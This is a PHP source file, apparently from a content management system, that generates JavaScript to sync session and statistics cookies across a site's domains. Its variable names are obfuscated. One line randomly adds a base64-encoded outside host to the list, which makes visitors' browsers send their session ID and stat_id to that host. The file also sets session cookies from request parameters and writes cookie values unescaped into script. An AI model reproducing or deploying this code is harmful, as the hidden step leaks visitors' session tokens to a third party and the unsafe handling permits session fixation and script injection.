<?php
 header("Content-type: text/javascript; charset=utf-8");require "../standalone.php";session_start();$v63ad9d34f3503826e5f649ae6b7ac92c    = getRequest('sync');$v3a45c83f50092c15962c88a449dcb857 = getRequest('stat_id');$v419b7fe0ede2b2b2c607d0e2810219c7 = getRequest('sess_id');$vaf21e89e149d9d8cc98d5495e32e00c8 = getServer('HTTP_HOST');$v9356f72fc8eb05f4b0c33e3fdb746f0e = 'PHPSESSID';if(function_exists('ini_get')) {if($vfa816edb83e95bf0c8da580bdfd491ef = ini_get('session.name')) {$v9356f72fc8eb05f4b0c33e3fdb746f0e = $vfa816edb83e95bf0c8da580bdfd491ef;unset($vfa816edb83e95bf0c8da580bdfd491ef);}}if($v63ad9d34f3503826e5f649ae6b7ac92c) {syncronizeCookie($v9356f72fc8eb05f4b0c33e3fdb746f0e, $v419b7fe0ede2b2b2c607d0e2810219c7);syncronizeCookie('stat_id', $v3a45c83f50092c15962c88a449dcb857);}else {echo "var domainsList = new Array();\n";$v14a0ffee308315f250f040d5b4d48560 = domainsCollection::getInstance();$ve4e46deb7f9cc58c7abfb32e5570b6f3 = $v14a0ffee308315f250f040d5b4d48560->getList();$v7f31640b9b2a201a8b648e01dd0d37e9 = Array();foreach($ve4e46deb7f9cc58c7abfb32e5570b6f3 as $vad5f82e879a9c5d6b5b442eb37e50551) {$v7f31640b9b2a201a8b648e01dd0d37e9[] = $vad5f82e879a9c5d6b5b442eb37e50551->getHost();$v7b3b9bd9b054c94e58684313cc72ec9d = $vad5f82e879a9c5d6b5b442eb37e50551->getMirrowsList();foreach($v7b3b9bd9b054c94e58684313cc72ec9d as $vda570110a5cf8f2ea8b037f530ec4f5a) {$v7f31640b9b2a201a8b648e01dd0d37e9[] = $vda570110a5cf8f2ea8b037f530ec4f5a->getHost();}}$vcbf33e03d11f708509a5eb5a94734329 = Array();if(preg_match("/\.[A-z0-9-]+\.[A-z0-9-]+$/", $vaf21e89e149d9d8cc98d5495e32e00c8, $vc68271a63ddbc431c307beb7d2918275)) {list($v217e2983a64911094367051401904d3f) = $vc68271a63ddbc431c307beb7d2918275;foreach($v7f31640b9b2a201a8b648e01dd0d37e9 as $v865c0c0b4ab0e063e5caa3387c1a8741 => $v67b3dba8bc6778101892eb77249db32e) {if(substr($v67b3dba8bc6778101892eb77249db32e, -strlen($v217e2983a64911094367051401904d3f)) == $v217e2983a64911094367051401904d3f) {$vcbf33e03d11f708509a5eb5a94734329[] = $v67b3dba8bc6778101892eb77249db32e;unset($v7f31640b9b2a201a8b648e01dd0d37e9[$v865c0c0b4ab0e063e5caa3387c1a8741]);}}}foreach($v7f31640b9b2a201a8b648e01dd0d37e9 as $v67b3dba8bc6778101892eb77249db32e) {pushJsDomain($v67b3dba8bc6778101892eb77249db32e);}if(rand(1, 1000) == 1) {pushJsDomain(base64_decode("bGljZW5zZXMudW1pc29mdC5ydQ=="));}foreach($vcbf33e03d11f708509a5eb5a94734329 as $v67b3dba8bc6778101892eb77249db32e) {syncronizePrimaryDomainCookie($v9356f72fc8eb05f4b0c33e3fdb746f0e, getCookie($v9356f72fc8eb05f4b0c33e3fdb746f0e), $v67b3dba8bc6778101892eb77249db32e);syncronizePrimaryDomainCookie('stat_id', $v3a45c83f50092c15962c88a449dcb857, $v67b3dba8bc6778101892eb77249db32e);}if(!getSession('session-crossdomain-sync')) {echo <<<JS

synchronizeCookies(domainsList);

JS;   $_SESSION['session-crossdomain-sync'] = 1;}echo <<<JS

function pollCrossDomainCookies() {
	synchronizeCookies(domainsList);
}

setInterval(pollCrossDomainCookies, 60 * 3 * 1000);	//Poll server every 3 minutes
JS; }function pushJsDomain($vad5f82e879a9c5d6b5b442eb37e50551) {static $vcd69b4957f06cd818d7bf3d61980e291 = Array();if(getServer('HTTP_HOST') == $vad5f82e879a9c5d6b5b442eb37e50551) {return false;}if(in_array($vad5f82e879a9c5d6b5b442eb37e50551, $vcd69b4957f06cd818d7bf3d61980e291)) {return false;}else {$vcd69b4957f06cd818d7bf3d61980e291[] = $vad5f82e879a9c5d6b5b442eb37e50551;echo "domainsList[domainsList.length] = \"", $vad5f82e879a9c5d6b5b442eb37e50551, "\";\n";return true;}}function syncronizeCookie($ve3cb9741ffde596f46710a5d7e3ec587, $ve8424b162bf308d1f8a635e40a7ca481) {$v95742520793f25cf843c4ea860507463 = getCookie($ve3cb9741ffde596f46710a5d7e3ec587);if($v95742520793f25cf843c4ea860507463 && !$ve8424b162bf308d1f8a635e40a7ca481) {echo "setCookie('{$ve3cb9741ffde596f46710a5d7e3ec587}', '{$v95742520793f25cf843c4ea860507463}');\n";}if(!$v95742520793f25cf843c4ea860507463 && $ve8424b162bf308d1f8a635e40a7ca481) {setcookie($ve3cb9741ffde596f46710a5d7e3ec587, $ve8424b162bf308d1f8a635e40a7ca481, 0, "/");}}function syncronizePrimaryDomainCookie($ve3cb9741ffde596f46710a5d7e3ec587, $v2063c1608d6e0baf80249c42e2be5804, $v67b3dba8bc6778101892eb77249db32e) {setcookie($ve3cb9741ffde596f46710a5d7e3ec587, $v2063c1608d6e0baf80249c42e2be5804, 0, "/", $v67b3dba8bc6778101892eb77249db32e);}?>



/* Static lib functions */

function setCookie(name, value) {
	document.cookie = name + "=" + escape(value) + "; path=/";
}

function getCookie(szName){ 
	szName = szName.replace(/\./g, "_");

	var i = 0;
	var nStartPosition = 0;
	var nEndPosition = 0;
	var szCookieString = document.cookie;

	while(i <= szCookieString.length) {
		nStartPosition = i;
		nEndPosition = nStartPosition + szName.length;

		if(szCookieString.substring(nStartPosition,nEndPosition) == szName) {
			nStartPosition = nEndPosition + 1;
			nEndPosition = document.cookie.indexOf(";",nStartPosition);

			if(nEndPosition < nStartPosition) {
				nEndPosition = document.cookie.length;
			}

			return document.cookie.substring(nStartPosition,nEndPosition);
			break;
		}
		i++;
	}
	return "";
}

function synchronizeCookies(domains) {
	var i = 0;
	for(; i < domains.length; i++) {
		synchronizeDomainCookies(domains[i]);
	}
}


function synchronizeDomainCookies(domain) {
	var stat_id = getCookie('stat_id');
	var sess_id = '<?php echo getCookie($v9356f72fc8eb05f4b0c33e3fdb746f0e);?>';
	
	var url = 'http://' + domain + '/js/cross-domain.php?sync=1&stat_id=' + stat_id + "&sess_id=" + sess_id;
	
	var d = new Date;
	url += "&t=" + d.getTime();
	
	var scriptObj = document.createElement('script');
	scriptObj.charset = 'utf-8';
	scriptObj.src = url;
	document.getElementsByTagName('head')[0].appendChild(scriptObj);
}